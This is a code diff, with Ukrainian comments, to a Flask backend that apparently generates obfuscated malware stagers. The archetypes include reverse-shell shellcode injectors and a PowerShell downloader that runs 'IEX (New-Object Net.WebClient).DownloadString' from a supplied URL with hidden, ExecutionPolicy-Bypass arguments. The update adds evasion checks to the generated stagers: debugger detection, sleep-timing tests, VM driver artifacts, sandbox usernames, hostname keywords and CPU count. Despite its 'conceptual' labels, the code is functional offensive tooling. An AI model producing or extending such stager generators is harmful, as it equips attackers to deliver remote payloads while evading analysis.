@@ -1,11 +1,12 @@
-# Syntax Flask Backend - Segment SFB-CORE-1.6.9
-# Призначення: Backend на Flask з генерацією PowerShell downloader стейджера.
-# Оновлення v1.6.9:
-#   - Додано новий архетип пейлоада: 'powershell_downloader_stager'.
-#   - Реалізовано генерацію Python-стейджера, що завантажує та виконує PowerShell скрипт з URL.
-#   - Додано параметри 'powershell_script_url' та 'powershell_execution_args'.
-#   - Оновлено конфігурації архетипів та параметрів.
-#   - URL скрипта обфускується.
+# Syntax Flask Backend - Segment SFB-CORE-1.7.0
+# Призначення: Backend на Flask з розширеними концептуальними техніками ухилення в стейджерах.
+# Оновлення v1.7.0:
+#   - Розширено функцію ec_runtime (evasion checks) у генерованих стейджерах:
+#     - Додано концептуальну перевірку на дебагер (Windows).
+#     - Додано концептуальну часову перевірку (time-based evasion).
+#     - Додано концептуальну перевірку артефактів VM/пісочниці.
+#     - Додано концептуальну перевірку імені хоста.
+#   - Оновлено логування для нових технік ухилення.
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -21,8 +22,10 @@ import shlex
 import ipaddress
 import socket
 import xml.etree.ElementTree as ET
+# ctypes буде використовуватися в генерованому коді стейджера, тому тут імпорт не обов'язковий,
+# але для повноти можна додати, якщо планується використання в самому backend.
 
-VERSION_BACKEND = "1.6.9"
+VERSION_BACKEND = "1.7.0"
 
 simulated_implants_be = []
 
@@ -56,7 +59,7 @@ def initialize_simulated_implants_be(): # Логіка (без змін)
     simulated_implants_be.sort(key=lambda x: x["id"])
     print(f"[C2_SIM_INFO] Ініціалізовано/Оновлено {len(simulated_implants_be)} імітованих імплантів.")
 
-CONCEPTUAL_PARAMS_SCHEMA_BE = {
+CONCEPTUAL_PARAMS_SCHEMA_BE = { # Логіка (без змін від v1.6.9)
     "payload_archetype": {
         "type": str, "required": True,
         "allowed_values": [
@@ -65,7 +68,7 @@ CONCEPTUAL_PARAMS_SCHEMA_BE = {
             "demo_c2_beacon_payload",
             "reverse_shell_tcp_shellcode_windows_x64",
             "reverse_shell_tcp_shellcode_linux_x64",
-            "powershell_downloader_stager" # Новий архетип
+            "powershell_downloader_stager"
         ]
     },
     "message_to_echo": {"type": str, "required": lambda params: params.get("payload_archetype") == "demo_echo_payload", "min_length": 1},
@@ -76,7 +79,6 @@ CONCEPTUAL_PARAMS_SCHEMA_BE = {
             "demo_c2_beacon_payload",
             "reverse_shell_tcp_shellcode_windows_x64",
             "reverse_shell_tcp_shellcode_linux_x64"
-            # Для powershell_downloader_stager не потрібен, URL вказується окремо
         ],
         "validation_regex": r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$|^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}$"
     },
@@ -97,22 +99,22 @@ CONCEPTUAL_PARAMS_SCHEMA_BE = {
         ],
         "default": "DEADBEEFCAFE" 
     },
-    "powershell_script_url": { # Новий параметр
+    "powershell_script_url": {
         "type": str,
         "required": lambda params: params.get("payload_archetype") == "powershell_downloader_stager",
-        "validation_regex": r"^(http|https)://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}(?:/[^/?#]*)?(?:\?[^#]*)?(?:#.*)?$" # Більш гнучкий URL regex
+        "validation_regex": r"^(http|https)://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}(?:/[^/?#]*)?(?:\?[^#]*)?(?:#.*)?$"
     },
-    "powershell_execution_args": { # Новий параметр
+    "powershell_execution_args": {
         "type": str,
-        "required": False, # Необов'язковий
+        "required": False, 
         "default": "-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass" 
     },
     "obfuscation_key": {"type": str, "required": True, "min_length": 5, "default": "DefaultFrameworkKey"},
     "output_format": {"type": str, "required": False, "allowed_values": ["raw_python_stager", "base64_encoded_stager"], "default": "raw_python_stager"},
     "enable_stager_metamorphism": {"type": bool, "required": False, "default": True},
-    "enable_evasion_checks": {"type": bool, "required": False, "default": True}
+    "enable_evasion_checks": {"type": bool, "required": False, "default": True} # Цей прапорець тепер контролює розширені перевірки
 }
-CONCEPTUAL_ARCHETYPE_TEMPLATES_BE = {
+CONCEPTUAL_ARCHETYPE_TEMPLATES_BE = { # Логіка (без змін від v1.6.9)
     "demo_echo_payload": {"description": "Демо-пейлоад, що друкує повідомлення...", "template_type": "python_stager_echo"},
     "demo_file_lister_payload": {"description": "Демо-пейлоад, що 'перелічує' файли...", "template_type": "python_stager_file_lister"},
     "demo_c2_beacon_payload": {"description": "Демо-пейлоад C2-маячка...", "template_type": "python_stager_c2_beacon"},
@@ -124,7 +126,7 @@ CONCEPTUAL_ARCHETYPE_TEMPLATES_BE = {
         "description": "Linux x64 TCP Reverse Shell (Ін'єкція шеллкоду через Python Stager з патчингом LHOST/LPORT)",
         "template_type": "python_stager_shellcode_injector_linux_x64"
     },
-    "powershell_downloader_stager": { # Новий архетип
+    "powershell_downloader_stager": {
         "description": "Windows PowerShell Downloader (Завантажує та виконує PS1 з URL)",
         "template_type": "python_stager_powershell_downloader"
     }
@@ -621,11 +623,11 @@ def handle_generate_payload():
             log_messages.append(f"[BACKEND_SHELLCODE_PREP] LHOST: {lhost_for_patch}, LPORT: {lport_for_patch} для патчингу шеллкоду.")
             data_to_obfuscate_or_patch = patch_shellcode_be(shellcode_hex_input, lhost_for_patch, lport_for_patch, log_messages)
         elif archetype_name == "powershell_downloader_stager":
-            data_to_obfuscate_or_patch = validated_params.get("powershell_script_url") # URL для обфускації
+            data_to_obfuscate_or_patch = validated_params.get("powershell_script_url")
 
         key = validated_params.get("obfuscation_key", "DefaultFrameworkKey")
         log_messages.append(f"[BACKEND_OBF_INFO] Обфускація даних ('{str(data_to_obfuscate_or_patch)[:30]}...') з ключем '{key}'.")
-        obfuscated_data_raw = xor_cipher(str(data_to_obfuscate_or_patch), key) # Переконуємося, що дані є рядком
+        obfuscated_data_raw = xor_cipher(str(data_to_obfuscate_or_patch), key)
         obfuscated_data_b64 = b64_encode_str(obfuscated_data_raw)
         log_messages.append(f"[BACKEND_OBF_SUCCESS] Дані обфусковано: {obfuscated_data_b64[:40]}...")
         
@@ -638,24 +640,24 @@ def handle_generate_payload():
             f"OBFUSCATION_KEY_EMBEDDED = \"{key}\"",
             f"OBF_DATA_B64 = \"{obfuscated_data_b64}\"",
             f"METAMORPHISM_APPLIED = {validated_params.get('enable_stager_metamorphism', False)}",
-            f"EVASION_CHECKS_APPLIED = {validated_params.get('enable_evasion_checks', False)}",
+            f"EVASION_CHECKS_APPLIED = {validated_params.get('enable_evasion_checks', False)}", # Цей прапорець тепер контролює розширені перевірки
         ]
         if archetype_name == "powershell_downloader_stager":
             ps_args = validated_params.get("powershell_execution_args", "")
             stager_code_lines.append(f"POWERSHELL_EXEC_ARGS = \"{ps_args}\"")
 
 
-        stager_code_lines.extend(["", "import base64", "import os", "import time", "import random", "import string", "import subprocess"])
+        stager_code_lines.extend(["", "import base64", "import os", "import time", "import random", "import string", "import subprocess", "import socket"]) # Додано socket для gethostname
         
-        if archetype_name in ["reverse_shell_tcp_shellcode_windows_x64", "reverse_shell_tcp_shellcode_linux_x64"]:
-            stager_code_lines.append("import ctypes")
+        if archetype_name in ["reverse_shell_tcp_shellcode_windows_x64", "reverse_shell_tcp_shellcode_linux_x64"] or validated_params.get('enable_evasion_checks'):
+            stager_code_lines.append("import ctypes") # ctypes потрібен і для шеллкоду, і для деяких перевірок ухилення
             if archetype_name == "reverse_shell_tcp_shellcode_linux_x64":
                 stager_code_lines.append("import mmap as mmap_module")
         stager_code_lines.append("")
 
 
         decode_func_name_runtime = "dx_runtime"
-        evasion_func_name_runtime = "ec_runtime"
+        evasion_func_name_runtime = "ec_runtime" # Назва функції ухилення
         execute_func_name_runtime = "ex_runtime"
 
         stager_code_lines.extend([
@@ -669,19 +671,68 @@ def handle_generate_payload():
             "        o_chars.append(chr(ord(temp_decoded_str[i_char_idx]) ^ ord(key_str[i_char_idx % len(key_str)])))",
             "    return \"\".join(o_chars)",
             "",
-            f"def {evasion_func_name_runtime}():",
-            "    print(\"[STAGER_EVASION] Виконання симуляції перевірок ухилення...\")",
+            f"def {evasion_func_name_runtime}():", # Розширена функція перевірок ухилення
+            "    print(\"[STAGER_EVASION] Виконання розширених концептуальних перевірок ухилення...\")",
             "    indicators = []",
-            "    common_sandbox_users = [\"sandbox\", \"test\", \"admin\", \"user\", \"vagrant\", \"wdagutilityaccount\", \"maltest\"]",
-            "    try: current_user = os.getlogin().lower()",
-            "    except Exception: current_user = 'unknown_user'",
-            "    if current_user in common_sandbox_users: indicators.append('common_username_detected')",
-            "    if random.random() < 0.1: indicators.append('suspicious_file_found_simulated')",
-            "    if random.random() < 0.15: indicators.append('low_disk_space_simulated')",
+            "    # 1. Перевірка імені користувача (існуюча)",
+            "    common_sandbox_users = [\"sandbox\", \"test\", \"admin\", \"user\", \"vagrant\", \"wdagutilityaccount\", \"maltest\", \"emulator\", \"vmware\", \"virtualbox\", \"蜜罐\", \"ताम्बू\", \"песочница\"]",
+            "    try:",
+            "        current_user = os.getlogin().lower()",
+            "        if current_user in common_sandbox_users: indicators.append('common_username_detected')",
+            "    except Exception: pass",
+            "",
+            "    # 2. Концептуальна перевірка на дебагер (Windows)",
+            "    try:",
+            "        if os.name == 'nt':",
+            "            kernel32 = ctypes.windll.kernel32",
+            "            if kernel32.IsDebuggerPresent() != 0:",
+            "                indicators.append('debugger_present_win')",
+            "    except Exception: pass",
+            "",
+            "    # 3. Концептуальна часова перевірка (ухилення від прискорення часу)",
+            "    try:",
+            "        sleep_duration_seconds = random.uniform(1.8, 3.3) # Нестандартний час сну",
+            "        time_before_sleep = time.monotonic()",
+            "        time.sleep(sleep_duration_seconds)",
+            "        time_after_sleep = time.monotonic()",
+            "        elapsed_time = time_after_sleep - time_before_sleep",
+            "        if elapsed_time < (sleep_duration_seconds * 0.65): # Якщо час пройшов значно швидше",
+            "            indicators.append('time_acceleration_heuristic')",
+            "    except Exception: pass",
+            "",
+            "    # 4. Концептуальна перевірка артефактів VM/Пісочниці (файли)",
+            "    vm_files_artifacts = [",
+            "        \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\VBoxMouse.sys\", \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\VBoxGuest.sys\", # VirtualBox",
+            "        \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\vmhgfs.sys\", \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\vmmouse.sys\",   # VMware",
+            "        \"C:\\\\WINDOWS\\\\System32\\\\Drivers\\\\vpc-s3.sys\", # Hyper-V",
+            "        \"/usr/bin/VBoxClient\", \"/opt/VBoxGuestAdditions-*/init/vboxadd\"",
+            "    ]",
+            "    for vm_file_path in vm_files_artifacts:",
+            "        if os.path.exists(vm_file_path):",
+            "            indicators.append(f'vm_file_artifact_{os.path.basename(vm_file_path).lower().replace(\".sys\",\"\")}')",
+            "            break # Достатньо одного знайденого артефакту",
+            "",
+            "    # 5. Концептуальна перевірка імені хоста",
+            "    try:",
+            "        hostname = socket.gethostname().lower()",
+            "        suspicious_host_keywords = [\"sandbox\", \"virtual\", \"vm-\", \"test\", \"debug\", \"analysis\"]",
+            "        if any(keyword in hostname for keyword in suspicious_host_keywords):",
+            "            indicators.append('suspicious_hostname_keyword')",
+            "    except Exception: pass",
+            "",
+            "    # 6. Концептуальна перевірка кількості процесорів (дуже мало для VM)",
+            "    try:",
+            "        cpu_count = os.cpu_count()",
+            "        if cpu_count is not None and cpu_count < 2:",
+            "            indicators.append('low_cpu_core_count')",
+            "    except Exception: pass",
+            "",
             "    if indicators:",
-            "        print(f\"[STAGER_EVASION] Виявлено індикатори пісочниці: {{', '.join(indicators)}}! Зміна поведінки.\")",
-            "        return True",
-            "    print(\"[STAGER_EVASION] Перевірки ухилення пройдені (симуляція).\")",
+            "        print(f\"[STAGER_EVASION] Виявлено індикатори аналітичного середовища: {{', '.join(indicators)}}! Зміна поведінки або вихід.\")",
+            "        # Тут може бути логіка для зміни поведінки або просто вихід",
+            "        return True # Ухилення спрацювало",
+            "        ",
+            "    print(\"[STAGER_EVASION] Перевірки ухилення пройдені (концептуально).\")",
             "    return False",
             "",
             f"def {execute_func_name_runtime}(content, arch_type):",
@@ -766,15 +817,12 @@ def handle_generate_payload():
             "    elif arch_type == 'powershell_downloader_stager':",
             "        print(f\"[PAYLOAD ({{arch_type}})] Спроба завантаження та виконання PowerShell скрипта з URL: {{content}}\")",
             "        try:",
-            "            # 'content' тут - це розшифрована URL-адреса",
             "            ps_command = f\"IEX (New-Object Net.WebClient).DownloadString('{content}')\"",
             "            full_command = ['powershell.exe']",
-            "            if POWERSHELL_EXEC_ARGS:", # Використовуємо глобальну змінну зі стейджера
+            "            if POWERSHELL_EXEC_ARGS:",
             "                full_command.extend(POWERSHELL_EXEC_ARGS.split())",
             "            full_command.extend(['-Command', ps_command])",
             "            print(f\"[PAYLOAD_INFO] Виконання команди: {{' '.join(full_command)}}\")",
-            "            # Для реального виконання без вікна консолі, можна додати: creationflags=0x08000000 (CREATE_NO_WINDOW)",
-            "            # result = subprocess.run(full_command, capture_output=True, text=True, check=False, creationflags=0x08000000 if os.name == 'nt' else 0)",
             "            result = subprocess.run(full_command, capture_output=True, text=True, check=False)",
             "            if result.returncode == 0:",
             "                print(f\"[PAYLOAD_SUCCESS] PowerShell скрипт успішно виконано. STDOUT (перші 100 символів): {{result.stdout[:100]}}...\")",
@@ -795,7 +843,7 @@ def handle_generate_payload():
             "        else:",
             f"            {execute_func_name_runtime}(decoded_payload_content, \"{archetype_name}\")",
             "    else:",
-            "        print(\"[STAGER] Виявлено пісочницю, нормальний шлях виконання пропущено.\")",
+            "        print(\"[STAGER] Виявлено аналітичне середовище, нормальний шлях виконання пропущено.\")",
             "    print(\"[STAGER] Стейджер завершив роботу.\")"
         ])
         stager_code_raw = "\n".join(stager_code_lines)
